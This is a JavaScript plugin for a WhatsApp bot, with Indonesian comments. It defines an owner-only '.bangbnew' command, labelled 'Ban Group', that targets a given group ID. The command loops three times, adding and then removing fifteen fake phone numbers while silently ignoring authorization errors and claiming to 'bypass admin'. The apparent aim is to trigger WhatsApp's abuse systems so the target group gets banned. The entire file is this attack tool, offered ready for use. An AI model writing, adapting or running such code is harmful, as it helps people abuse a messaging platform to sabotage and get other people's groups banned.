import makeWASocket, { useMultiFileAuthState, Browsers } from "ourin"

const pluginConfig = {
    name: 'bangbnew',
    alias: ['bangbnewnih', 'gbban'],
    category: 'owner',
    description: '💀 Ban Group (BangBWork)',
    usage: '.bangbnew <group_id>',
    example: '.bangbnew 120363408544989663@g.us',
    isOwner: true,
    isPremium: false,
    isGroup: false,
    isPrivate: false,
    cooldown: 120,
    energi: 10,
    isEnabled: true
}

// ─── FUNGSI BANGBWORK (TANPA CEK ADMIN) ──────────────────────
async function bangbwork(sock, jidGroup, safeReply) {
    const fakeNumbers = [
        '15550101@s.whatsapp.net', '15550102@s.whatsapp.net', '15550103@s.whatsapp.net',
        '15550104@s.whatsapp.net', '15550105@s.whatsapp.net', '15550106@s.whatsapp.net',
        '15550107@s.whatsapp.net', '15550108@s.whatsapp.net', '15550109@s.whatsapp.net',
        '15550110@s.whatsapp.net', '15550111@s.whatsapp.net', '15550112@s.whatsapp.net',
        '15550113@s.whatsapp.net', '15550114@s.whatsapp.net', '15550115@s.whatsapp.net'
    ];

    try {
        console.log(\x1b[31m[BANGBWORK]\x1b[0m Memulai proses paksa (Bypass Admin)...);

        for (let i = 0; i < 3; i++) {
            console.log(\x1b[31m[BANGBWORK]\x1b[0m Loop ${i + 1}/3: Mencoba Add...);
            
            for (let j = 0; j < fakeNumbers.length; j++) {
                const num = fakeNumbers[j];
                try {
                    await sock.groupParticipantsUpdate(jidGroup, [num], 'add');
                    await new Promise(r => setTimeout(r, 500));
                } catch (err) {
                    // Diem aja kalau error not-authorized
                }
            }

            await new Promise(r => setTimeout(r, 2000));

            console.log(\x1b[33m[BANGBWORK]\x1b[0m Loop ${i + 1}/3: Mencoba Remove...);
            for (let j = 0; j < fakeNumbers.length; j++) {
                const num = fakeNumbers[j];
                try {
                    await sock.groupParticipantsUpdate(jidGroup, [num], 'remove');
                    await new Promise(r => setTimeout(r, 500));
                } catch (err) {
                    // Diem aja kalau error
                }
            }

            await new Promise(r => setTimeout(r, 2000));
        }
        
        console.log(\x1b[32m[BANGBWORK]\x1b[0m Selesai maksa jalan.);
        safeReply("✅ Proses BangBWork selesai dijalankan! (Cek console)");

    } catch (error) {
        console.error(\x1b[31m[BANGBWORK] Global Error:\x1b[0m, error.message);
        safeReply(❌ Error Sistem: ${error.message});
    }
}

// ─── HANDLER UTAMA ───────────────────────────────────────────
async function handler(m, { sock }) {
    const safeReply = (text) => {
        try {
            if (typeof m.reply === 'function') return m.reply(text)
            if (typeof sock.sendMessage === 'function') return sock.sendMessage(m.chat || m.from, { text })
            return sock.relayMessage(m.chat || m.from, { conversation: text }, {})
        } catch (e) {}
    }

    try {
        const args = m.args || []
        const prefix = m.prefix || '.'
        const text = args[0]?.trim()

        if (!text) {
            return safeReply(Mana target grupnya?\nContoh: ${prefix}bangbnew 123456789@g.us)
        }
        
        const target = text.includes('@g.us') ? text : text + '@g.us';
        
        await safeReply("⏳ Memproses bangbwork (Bypass Admin)...");
        
        // Jalanin di background biar gak nge-hang
        bangbwork(sock, target, safeReply).catch(console.error);

    } catch (error) {
        console.error('[bangbnew]', error.message)
        safeReply(❌ Error: ${error.message.slice(0, 100)})
    }
}

export { pluginConfig as config, handler }